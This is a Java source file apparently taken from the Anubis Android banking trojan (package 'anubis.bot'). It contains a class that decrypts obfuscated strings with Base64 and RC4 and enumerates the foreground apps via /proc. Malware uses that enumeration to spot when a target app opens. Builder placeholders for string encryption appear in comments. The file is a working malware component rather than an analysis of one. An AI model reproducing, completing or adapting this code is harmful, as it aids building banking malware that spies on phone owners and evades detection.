package anubis.bot.myapplication.API.ProcessesSDK6;

import android.content.Context;
import android.content.pm.PackageManager;
import android.util.Base64;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.UtilsClass;

public class classProcAndroidPROCESSES {
  UtilsClass SF = new UtilsClass();
  //MINImusor2
  //[@@@fuctionsCryptText@@@]
  //MINImusor1

  public String str_decrypt(String textDE_C, String key)
  {
    UtilsClass utilsClass = new UtilsClass();
    try
    {
      byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
      textDE_C = new String(data, "UTF-8");
      byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
      ClassRC4 rcd = new ClassRC4(key.getBytes());
      return  new String(rcd.decrypt(detext));
    }catch (Exception ex){ }
    return "";
  }


  public static List<classProcAndroidAppProcess> getRunningForegroundApps (Context context) {
    UtilsClass SF = new UtilsClass();
    List<classProcAndroidAppProcess> processes = new ArrayList<>();
    File[] files = new File("/proc").listFiles();
    PackageManager pm = context.getPackageManager();
    for (File file : files) {
      if (file.isDirectory()) {
        int pid;
        try {
          pid = Integer.parseInt(file.getName());
        } catch (NumberFormatException e) {
          continue;
        }
        try {
          classProcAndroidAppProcess process = new classProcAndroidAppProcess(pid);
          if (process.foreground && (process.uid < 1000 || process.uid > 9999)
              && !process.name.contains(Character.toString(':'))
              && pm.getLaunchIntentForPackage(process.getPackName()) != null) {
            processes.add(process);
          }
        } catch (classProcAndroidAppProcess.NotAndroidAppProcessException ignored) {
        } catch (IOException e) {
        }
      }
    }
    return processes;
  }
  //[@@@fuctionsCryptTextStatic@@@]
  classProcAndroidPROCESSES() {
    throw new AssertionError("no instances");
  }
}